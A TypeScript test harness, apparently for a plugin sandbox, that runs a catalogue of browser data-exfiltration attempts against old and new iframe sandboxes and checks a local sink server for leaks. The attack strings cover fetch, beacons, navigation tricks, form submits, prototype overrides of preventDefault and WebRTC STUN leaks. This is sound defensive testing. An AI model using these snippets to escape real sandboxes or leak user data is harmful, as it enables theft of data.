import type { Manifest } from '../loader/manifest';
import { originTransport, srcdocTransport } from '../loader/sandbox';
import type { Transport } from '../loader/host';
import { sandboxPage } from './page';

// Attack lab: the reviewers' exfiltration attempts, run against the old sandboxes (srcdoc frames
// with a CSP meta tag, as on the plugin-loader and prototype branches) and the sandbox origin.
// A leak = the dev sandbox server's sink (`--sink`) saw the request / UDP packet. Used by the demo
// page (sandbox.html) and the headless test (scripts/sandbox-attacks.mjs).

export type Where = 'page' | 'plugin';
export type Mode = 'before' | 'now';
export interface Attack {
  id: string;
  name: string;
  where: Where[];
  /** JS run inside the sandbox. In scope: SINK (http URL prefix), STUN (stun: URL), report(text). */
  code: string;
  /** Needs this plugin capability (control case). */
  network?: boolean;
  wait?: number;
}
export interface Outcome {
  attack: string;
  where: Where;
  mode: Mode;
  leaked: string[];
  notes: string[];
}

const ALL: Where[] = ['page', 'plugin'];
export const ATTACKS: Attack[] = [
  { id: 'fetch', name: 'fetch() to an outside server', where: ALL, code: `fetch(SINK + '/fetch?secret=42').then(() => report('fetch ok'), () => report('fetch failed'))` },
  { id: 'websocket', name: 'WebSocket', where: ALL, code: `try { const w = new WebSocket(SINK.replace('http', 'ws') + '/ws'); w.onerror = () => report('ws error'); } catch (e) { report('ws threw ' + e.name) }` },
  { id: 'beacon', name: 'navigator.sendBeacon', where: ALL, code: `report('beacon ' + navigator.sendBeacon(SINK + '/beacon', 'secret'))` },
  { id: 'image', name: 'image load', where: ALL, code: `const i = new Image(); i.src = SINK + '/img?secret=42'` },
  { id: 'css', name: 'CSS background URL', where: ['page'], code: `document.body.insertAdjacentHTML('beforeend', '<div style="background:url(' + SINK + '/css)">x</div>')` },
  { id: 'prefetch', name: '<link rel=prefetch>', where: ['page'], code: `document.head.insertAdjacentHTML('beforeend', '<link rel="prefetch" href="' + SINK + '/prefetch">')` },
  { id: 'nav', name: 'self-navigation (location.href = …?secret)', where: ALL, code: `location.href = SINK + '/nav?secret=42'` },
  { id: 'navapi', name: 'navigation.navigate(…?secret)', where: ['page'], code: `navigation.navigate(SINK + '/navapi?secret=42')` },
  { id: 'meta', name: 'meta refresh', where: ['page'], code: `document.head.insertAdjacentHTML('beforeend', '<meta http-equiv="refresh" content="0;url=' + SINK + '/meta?secret=42">')` },
  { id: 'link', name: 'link click', where: ['page'], code: `const a = document.createElement('a'); a.href = SINK + '/link?secret=42'; document.body.append(a); a.click()` },
  { id: 'pd', name: 'navigate after replacing preventDefault', where: ['page'], code: `Event.prototype.preventDefault = function () {}; NavigateEvent.prototype.preventDefault = function () {}; Function.prototype.call = function () {}; Reflect.apply = function () {}; location.href = SINK + '/pd?secret=42'` },
  { id: 'docopen', name: 'document.open() then navigate', where: ['page'], code: `document.open(); document.write('<p>replaced</p>'); document.close(); setTimeout(() => (location.href = SINK + '/docopen?secret=42'), 50)` },
  { id: 'form', name: 'form submit', where: ['page'], code: `document.body.insertAdjacentHTML('beforeend', '<form action="' + SINK + '/form"><input name="secret" value="42"></form>'); document.forms[document.forms.length - 1].submit()` },
  { id: 'open', name: 'window.open popup', where: ALL, code: `report('open → ' + window.open(SINK + '/open?secret=42'))` },
  { id: 'top', name: 'top-level navigation', where: ALL, code: `top.location.href = SINK + '/top?secret=42'` },
  { id: 'childnav', name: 'child frame navigates its parent', where: ['page'], code: `const f = document.createElement('iframe'); document.body.append(f); const s = f.contentDocument.createElement('script'); s.textContent = "parent.location.href = '" + SINK + "/childnav?secret=42'"; f.contentDocument.body.append(s)` },
  { id: 'parent', name: 'read the app (parent.document)', where: ALL, code: `report('read app title: ' + parent.document.title)` },
  { id: 'sibling', name: 'read another sandbox frame', where: ALL, code: `let n = 0; for (let i = 0; i < parent.frames.length; i++) { try { if (parent.frames[i] !== self && parent.frames[i].document.body.textContent.includes('victim')) n++; } catch {} } report('sibling frames read: ' + n)` },
  { id: 'storage', name: 'read app storage (localStorage)', where: ALL, code: `report('storage keys: ' + Object.keys(localStorage).join(',') + ' (' + location.host + ')')` },
  {
    id: 'webrtc',
    name: 'WebRTC STUN request (data in the server address)',
    where: ALL,
    wait: 2500,
    code: `const pc = new RTCPeerConnection({ iceServers: [{ urls: STUN }] }); pc.createDataChannel('x'); pc.createOffer().then((o) => pc.setLocalDescription(o)); report('RTCPeerConnection created')`,
  },
  {
    id: 'webrtc-child',
    name: 'WebRTC from a child frame\'s fresh globals',
    where: ['page'],
    wait: 2500,
    code: `const f = document.createElement('iframe'); document.body.append(f); const PC = window[window.length - 1].RTCPeerConnection; const pc = new PC({ iceServers: [{ urls: STUN }] }); pc.createDataChannel('x'); pc.createOffer().then((o) => pc.setLocalDescription(o)); report('RTCPeerConnection from child frame')`,
  },
  { id: 'import', name: 'import() / importScripts() from the network', where: ['plugin'], code: `import(SINK + '/import.js').then(() => report('imported'), () => report('import failed')); try { importScripts(SINK + '/importscripts.js') } catch (e) { report('importScripts threw ' + e.name) }` },
  { id: 'control', name: 'control: fetch to a declared network origin', where: ['plugin'], network: true, code: `fetch(SINK + '/control').then(() => report('fetch ok'), () => report('fetch failed'))` },
];

const SECRET_REPORT = (id: string) => `const report = (r) => { const m = { lab: ${JSON.stringify(id)}, result: String(r).slice(0, 200) }; if (typeof window !== 'undefined' && window.parent !== window) window.parent.postMessage(m, '*'); else postMessage(m); };`;
const wrap = (a: Attack, sink: string, stun: string, id: string) =>
  `const SINK = ${JSON.stringify(sink)}; const STUN = ${JSON.stringify(stun)}; ${SECRET_REPORT(id)}
try { ${a.code} } catch (e) { report('threw ' + (e && e.name) + ': ' + String(e && e.message).slice(0, 120)); }`;

// the CSPs the two earlier branches used (meta tags in srcdoc frames)
const PROTOTYPE_CSP = "default-src 'none'; script-src 'unsafe-inline'; style-src 'unsafe-inline'; img-src data: blob:; font-src data:; media-src data: blob:";

export interface LabEnv {
  /** e.g. http://127.0.0.1:5227 (the sandbox server run with --sink) */
  sinkOrigin: string;
  stun: string;
  host: HTMLElement;
}

async function sinkLog(env: LabEnv): Promise<{ kind: string; what: string; at: number }[]> {
  return (await fetch(`${env.sinkOrigin}/__sink/log`, { cache: 'no-store' })).json();
}

const sleep = (ms: number) => new Promise((r) => setTimeout(r, ms));
const victimHtml = '<p>victim: sandbox frame with a secret</p>';

/** Run one attack in one place and mode. */
export async function runAttack(env: LabEnv, a: Attack, where: Where, mode: Mode): Promise<Outcome> {
  const id = `${a.id}-${where}-${mode}-${Math.random().toString(36).slice(2, 7)}`;
  const sink = `${env.sinkOrigin}/__sink/${id}`;
  const code = wrap(a, sink, env.stun, id);
  const notes: string[] = [];
  const note = (s: string) => notes.includes(s) || notes.push(s);
  const t0 = Date.now();
  const cleanup: (() => void)[] = [];
  const onLab = (d: unknown) => {
    const m = d as { lab?: string; result?: string };
    if (m && m.lab === id && m.result) note(m.result);
  };
  // a victim frame of the same kind next to the attacker (for "read another sandbox frame")
  if (where === 'page') {
    if (mode === 'before') {
      for (const html of [victimHtml, `<p>attacker</p><script>${code.replace(/<\/script/gi, '<\\/script')}</script>`]) {
        const f = document.createElement('iframe');
        f.setAttribute('sandbox', 'allow-scripts');
        f.setAttribute('referrerpolicy', 'no-referrer');
        f.srcdoc = `<!doctype html><meta http-equiv="Content-Security-Policy" content="${PROTOTYPE_CSP}"><meta charset="utf-8">${html}`;
        let loads = 0;
        f.addEventListener('load', () => ++loads > 1 && note('frame navigated away'));
        const l = (e: MessageEvent) => e.source === f.contentWindow && onLab(e.data);
        window.addEventListener('message', l);
        env.host.append(f);
        cleanup.push(() => (window.removeEventListener('message', l), f.remove()));
      }
    } else {
      for (const html of [victimHtml, `<p>attacker</p><script>${code.replace(/<\/script/gi, '<\\/script')}</script>`]) {
        const p = sandboxPage(html, { bridge: false, hint: html === victimHtml ? 'victim' : 'lab' });
        p.onPageMessage(onLab);
        p.onHostNote((n) => note(n.t === 'blocked' ? `guard cancelled ${n.what}` : n.t === 'violation' ? `CSP: ${n.text.replace(env.sinkOrigin, '')}` : n.t));
        env.host.append(p.frame);
        cleanup.push(p.destroy);
      }
    }
  } else {
    const manifest: Manifest = { id: 'lab', name: 'Lab', version: '1', main: 'x.js', capabilities: a.network ? [`network:${env.sinkOrigin}`] : ['network:none'] };
    const source = `${code}\nexport default {};`;
    const ts: Transport[] = [];
    const make = mode === 'before' ? srcdocTransport : originTransport;
    const victim = make({ ...manifest, id: 'victim' }, 'document.body && (document.body.textContent = "victim");export default {};');
    const t = make(manifest, source);
    ts.push(victim, t);
    t.onMessage((m) => {
      const x = m as unknown as { t?: string; text?: string; error?: string };
      if (x.t === 'violation') note(`CSP: ${String(x.text).replace(env.sinkOrigin, '')}`);
      else if (x.t === 'fail') note(`stopped: ${x.error}`);
      else onLab(m);
    });
    cleanup.push(() => ts.forEach((x) => x.destroy()));
  }
  await sleep(a.wait ?? 1200);
  for (const c of cleanup) c();
  const log = await sinkLog(env);
  const leaked = log.filter((h) => (h.kind === 'http' && h.what.includes(id)) || (h.kind === 'udp' && a.id.startsWith('webrtc') && h.at >= t0)).map((h) => (h.kind === 'udp' ? `UDP ${h.what}` : h.what.replace(`/${id}`, '')));
  return { attack: a.id, where, mode, leaked: [...new Set(leaked)], notes };
}

/** Every attack, in both modes, one at a time (UDP hits are matched by time window). */
export async function runAll(env: LabEnv, onResult?: (o: Outcome) => void, filter?: (a: Attack) => boolean): Promise<Outcome[]> {
  const out: Outcome[] = [];
  for (const a of ATTACKS.filter(filter ?? (() => true)))
    for (const where of a.where)
      for (const mode of ['before', 'now'] as Mode[]) {
        const o = await runAttack(env, a, where, mode);
        out.push(o);
        onResult?.(o);
      }
  return out;
}
